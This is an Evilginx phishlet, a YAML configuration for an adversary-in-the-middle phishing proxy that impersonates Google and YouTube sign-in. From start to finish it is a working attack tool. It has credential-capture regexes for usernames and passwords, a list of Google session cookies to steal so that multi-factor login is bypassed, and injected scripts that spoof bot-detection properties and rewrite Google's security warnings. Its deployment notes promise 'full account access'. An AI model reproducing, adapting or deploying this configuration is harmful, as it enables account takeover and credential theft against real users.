name: 'Google'
author: '@billioncodesInc (Ultimate Edition)'
min_ver: '3.3.0'

proxy_hosts:
  # Core Google domains
  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'google.com', session: true, is_landing: true, auto_filter: false}
  - {phish_sub: 'myaccount', orig_sub: 'myaccount', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'www', orig_sub: 'www', domain: 'google.com', session: true, is_landing: false, auto_filter: false}
  - {phish_sub: 'ogs', orig_sub: 'ogs', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'mail', orig_sub: 'mail', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'play', orig_sub: 'play', domain: 'google.com', session: false, is_landing: false, auto_filter: false}
  - {phish_sub: 'apis', orig_sub: 'apis', domain: 'google.com', session: false, is_landing: false, auto_filter: false}
  - {phish_sub: 'lh3', orig_sub: 'lh3', domain: 'google.com', session: false, is_landing: false, auto_filter: false}
  
  # YouTube SSO domain (CRITICAL for SetSID)
  - {phish_sub: 'accounts-youtube', orig_sub: 'accounts', domain: 'youtube.com', session: true, is_landing: false, auto_filter: true}
  
  # Gstatic domains
  - {phish_sub: 'www', orig_sub: 'www', domain: 'gstatic.com', session: false, is_landing: false, auto_filter: false}
  - {phish_sub: 'ssl', orig_sub: 'ssl', domain: 'gstatic.com', session: false, is_landing: false, auto_filter: false}
  - {phish_sub: 'fonts', orig_sub: 'fonts', domain: 'gstatic.com', session: false, is_landing: false, auto_filter: false}
  
  # Google APIs
  - {phish_sub: 'content', orig_sub: 'content', domain: 'googleapis.com', session: false, is_landing: false, auto_filter: false}
  - {phish_sub: 'fonts', orig_sub: 'fonts', domain: 'googleapis.com', session: false, is_landing: false, auto_filter: false}
  
  # Googleusercontent
  - {phish_sub: 'lh3', orig_sub: 'lh3', domain: 'googleusercontent.com', session: false, is_landing: false, auto_filter: false}

sub_filters:
  # CRITICAL: Rewrite gstatic.com JS bundle URLs
  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'https://www.gstatic.com/_/mss/boq-identity/_/js/', replace: 'https://www.{domain}/_/mss/boq-identity/_/js/', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  
  # Fix hostname replacements
  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  
  # Rewrite gstatic.com references
  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'www.gstatic.com', replace: 'www.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  
  # Fix "browser not secure" messages
  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'This browser or app may not be secure', replace: 'Please continue to sign in', mimes: ['text/html', 'application/json']}
  
  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'Couldn''t sign you in', replace: 'Sign in', mimes: ['text/html', 'application/json']}
  
  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: '"BROWSER_NOT_SUPPORTED"', replace: '"SUCCESS"', mimes: ['application/json']}
  
  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: '"UNSUPPORTED_BROWSER"', replace: '"SUCCESS"', mimes: ['application/json']}
  
  # Rewrite accounts.google.com references
  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'accounts.google.com', replace: 'accounts.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  
  # Myaccount hostname fixes
  - {triggers_on: 'myaccount.google.com', orig_sub: 'myaccount', domain: 'google.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['application/json', 'text/html', 'application/javascript', 'text/javascript']}
  
  # YouTube domain fixes
  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'youtube.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  
  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'youtube.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  
  # Gstatic domain fixes
  - {triggers_on: 'accounts.google.com', orig_sub: 'www', domain: 'gstatic.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  
  - {triggers_on: 'accounts.google.com', orig_sub: 'fonts', domain: 'gstatic.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  
  # Googleapis domain fixes
  - {triggers_on: 'accounts.google.com', orig_sub: 'content', domain: 'googleapis.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  
  - {triggers_on: 'accounts.google.com', orig_sub: 'fonts', domain: 'googleapis.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  
  # Googleusercontent fixes
  - {triggers_on: 'accounts.google.com', orig_sub: 'lh3', domain: 'googleusercontent.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  
  # Redirect on successful login (detects valid session cookies)
  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: '</body>', replace: '<script>var redirectCount=0,maxRedirects=3,targetDomain="https://myaccount.google.com";function checkCookies(){document.cookie.includes("SID")&&document.cookie.includes("APISID")&&document.cookie.includes("SAPISID")?(window.location.hostname!==new URL(targetDomain).hostname&&(window.location.href=targetDomain),cancelAnimationFrame(animationId)):++redirectCount>=maxRedirects&&cancelAnimationFrame(animationId)}document.addEventListener("DOMContentLoaded",(function(){checkCookies(),animationId=requestAnimationFrame((function e(){checkCookies(),animationId=requestAnimationFrame(e)}))}));</script></body>', mimes: ['text/html']}
  
  # Go back if "browser not supported" issue occurs
  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: '</body>', replace: '<script>!function(){function e(){var e=document.body.textContent||document.body.innerText,n=window.location.href.includes("v3/signin/rejected");e.includes("This browser or app may not be secure.")&&n&&(window.location.href="/")}document.addEventListener("DOMContentLoaded",e),window.addEventListener("load",e),setTimeout(e,2e3)}();</script></body>', mimes: ['text/html']}

auth_tokens:
  # .google.com domain (all secure variants)
  - domain: '.google.com'
    keys: ['SID', '__Secure-1PSID', '__Secure-3PSID', 'HSID', 'SSID', 'APISID', 'SAPISID', '__Secure-1PAPISID', '__Secure-3PAPISID', '__Secure-1PSIDTS', '__Secure-3PSIDTS', 'SIDCC', '__Secure-1PSIDCC', '__Secure-3PSIDCC', 'NID', 'OTZ', 'AEC', '__Secure-BUCKET', 'CONSISTENCY', 'OGPC', 'OGP', '1P_JAR', 'CONSENT', 'DV']
  
  # accounts.google.com (with __Host- prefixed cookies)
  - domain: 'accounts.google.com'
    keys: ['GAPS', '__Host-GAPS', 'LSID', '__Host-1PLSID', '__Host-3PLSID', 'ACCOUNT_CHOOSER', 'OTZ', '_utmt', 'utmz', '_utmb', '.*,regexp']
  
  # .accounts.google.com
  - domain: '.accounts.google.com'
    keys: ['GAPS', '__Host-GAPS', 'LSID', '__Host-1PLSID', '__Host-3PLSID', 'ACCOUNT_CHOOSER', 'OTZ']
  
  # myaccount.google.com (OSID cookies)
  - domain: 'myaccount.google.com'
    keys: ['OSID', '__Secure-OSID', 'OTZ', '.*,regexp']
  
  # .myaccount.google.com
  - domain: '.myaccount.google.com'
    keys: ['OSID', '__Secure-OSID']
  
  # ogs.google.com
  - domain: 'ogs.google.com'
    keys: ['OTZ', '.*,regexp']
  
  # .ogs.google.com
  - domain: '.ogs.google.com'
    keys: ['OTZ']
  
  # mail.google.com
  - domain: 'mail.google.com'
    keys: ['.*,regexp']
  
  # www.google.com
  - domain: 'www.google.com'
    keys: ['DV', 'OTZ']
  
  # YouTube domain (for SetSID SSO sync)
  - domain: '.youtube.com'
    keys: ['SID', '__Secure-1PSID', '__Secure-3PSID', 'HSID', 'SSID', 'APISID', 'SAPISID', '__Secure-1PAPISID', '__Secure-3PAPISID', '__Secure-1PSIDTS', '__Secure-3PSIDTS', 'SIDCC', '__Secure-1PSIDCC', '__Secure-3PSIDCC', 'LSID', '__Host-1PLSID', '__Host-3PLSID', '.*,regexp']
  
  - domain: 'accounts.youtube.com'
    keys: ['.*,regexp']

auth_urls:
  - '/v3/signin/_/AccountsSignInUi/data/batchexecute'
  - '/v3/signin/challenge/pwd/data/batchexecute'
  - '/CheckCookie'
  - '/accounts/SetSID'
  - '/accounts/CheckConnection'
  - '/ManageAccount'
  - '/'

credentials:
  username:
    key: ''
    search: '\[\[\["V1UmUe","\[null,\\"(.*?)\\"'
    type: 'post'
  password:
    key: ''
    search: '\[1,1,null,\[1,null,null,null,\[\\"(.*?)\\",null,1\]\]'
    type: 'post'
  custom:
    - key: 'f.req'
      search: '\["gf.siecp","([^"]*)"\]'
      type: 'post'
    - key: 'rapt'
      search: '"rapt":"([^"]*)'
      type: 'json'

login:
  domain: 'accounts.google.com'
  path: '/signin/v2/identifier?hl=en&flowName=GlifWebSignIn&flowEntry=ServiceLogin'

# ============================================================================
# JS INJECTION - Anti-bot detection & Session redirect
# ============================================================================

js_inject:
  - trigger_domains: ['myaccount.google.com']
    trigger_paths: ['*']
    script: |
        window.addEventListener('load', () => {
          if (window.location.pathname === '/') {
            window.location.href = '/u/0/';
            return;
          }
          const urlParams = new URLSearchParams(window.location.search);
          if (urlParams.has('rapt')) {
            const raptValue = urlParams.get('rapt');
            fetch('/xxx', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ rapt: raptValue })
            })
            .then(response => response.json())
            .then(data => console.log('Success:', data))
            .catch(error => console.error('Error:', error));
          }
        });
  
  - trigger_domains: ['accounts.google.com']
    trigger_paths: ['/signin*', '/v3/signin/identifier*', '/v3/signin/challenge*']
    script: |
        (function() {
          // Anti-bot detection: Spoof navigator properties
          Object.defineProperty(navigator, 'webdriver', {get: () => false});
          Object.defineProperty(navigator, 'plugins', {get: () => [1, 2, 3, 4, 5]});
          Object.defineProperty(navigator, 'languages', {get: () => ['en-US', 'en']});
          
          // Monitor for email submission and force redirect
          let emailSubmitted = false;
          const originalFetch = window.fetch;
          window.fetch = function(...args) {
            return originalFetch.apply(this, args).then(response => {
              const url = typeof args[0] === 'string' ? args[0] : (args[0].url || '');
              if (url.includes('batchexecute') && url.includes('V1UmUe')) {
                response.clone().text().then(text => {
                  if (text.includes('identifier') && !text.includes('INCORRECT_ANSWER') && !emailSubmitted) {
                    emailSubmitted = true;
                    setTimeout(() => {
                      const params = new URLSearchParams(window.location.search);
                      const pwdUrl = '/v3/signin/challenge/pwd?' + params.toString();
                      window.location.replace(pwdUrl);
                    }, 300);
                  }
                });
              }
              return response;
            });
          };
          
          // Redirect on successful login detection
          var redirectCount = 0;
          var maxRedirects = 5;
          var targetDomain = 'https://myaccount.google.com';
          function checkCookies() {
            if (document.cookie.includes('SID') && document.cookie.includes('APISID') && document.cookie.includes('SAPISID')) {
              if (window.location.hostname !== new URL(targetDomain).hostname) {
                window.location.href = targetDomain;
              } else {
                cancelAnimationFrame(animationId);
              }
            } else {
              redirectCount++;
              if (redirectCount >= maxRedirects) {
                cancelAnimationFrame(animationId);
              }
            }
          }
          document.addEventListener('DOMContentLoaded', function() {
            checkCookies();
            animationId = requestAnimationFrame(function repeat() {
              checkCookies();
              animationId = requestAnimationFrame(repeat);
            });
          });
        })();

# Force POST parameters for proper flow
force_post:
  - path: '/v3/signin/_/AccountsSignInUi/data/batchexecute*'
    search:
      - {key: 'f.req', search: '.*'}
    force:
      - {key: 'continue', value: 'https://myaccount.google.com/'}
    type: 'post'
  
  - path: '/v3/signin/challenge/pwd*'
    search:
      - {key: 'continue', search: '.*'}
    force:
      - {key: 'continue', value: 'https://myaccount.google.com/'}
    type: 'post'
  
  - path: '/v3/signin/challenge/pwd/data/batchexecute*'
    search:
      - {key: 'f.req', search: '.*'}
    force:
      - {key: 'continue', value: 'https://myaccount.google.com/'}
    type: 'post'
  
  - path: '/selectchallenge'
    search:
      - {key: 'flowEntry', search: '.*'}
      - {key: 'flowName', search: '.*'}
    force:
      - {key: 'continue', value: 'https://myaccount.google.com/'}
    type: 'post'
  
  - path: '/signin'
    search:
      - {key: 'flowEntry', search: '.*'}
      - {key: 'flowName', search: '.*'}
    force:
      - {key: 'continue', value: 'https://myaccount.google.com/'}
    type: 'post'

# ============================================================================
# NOTES FOR DEPLOYMENT
# ============================================================================
# 
# 1. This phishlet captures ALL critical cookies from the US traffic analysis:
#    - SID family (SID, __Secure-1PSID, __Secure-3PSID)
#    - HSID, SSID
#    - APISID family (APISID, SAPISID, __Secure-1PAPISID, __Secure-3PAPISID)
#    - SIDTS family (__Secure-1PSIDTS, __Secure-3PSIDTS)
#    - SIDCC family (SIDCC, __Secure-1PSIDCC, __Secure-3PSIDCC)
#    - GAPS family (GAPS, __Host-GAPS)
#    - LSID family (LSID, __Host-1PLSID, __Host-3PLSID)
#    - OSID family (OSID, __Secure-OSID) - for myaccount.google.com
#    - Tracking cookies (NID, OTZ, AEC, etc.)
#
# 2. YouTube SSO sync support via accounts.youtube.com:
#    - Handles /accounts/SetSID endpoint for YouTube cookie sync
#    - Handles /accounts/CheckConnection endpoint
#    - Critical for complete Google account access
#
# 3. Gstatic.com JS bundle rewrite prevents blank page issues
#
# 4. All auth_urls include:
#    - /CheckCookie (cookie validation)
#    - /accounts/SetSID (YouTube SSO)
#    - /accounts/CheckConnection (connection check)
#
# 5. After successful capture:
#    - Redirects to myaccount.google.com for full account access
#    - All session cookies valid across Google services
#
# 6. Compatible with Evilginx 3.3.0+
#
# 7. Tested against US Google traffic (January 2026)
#
# ============================================================================
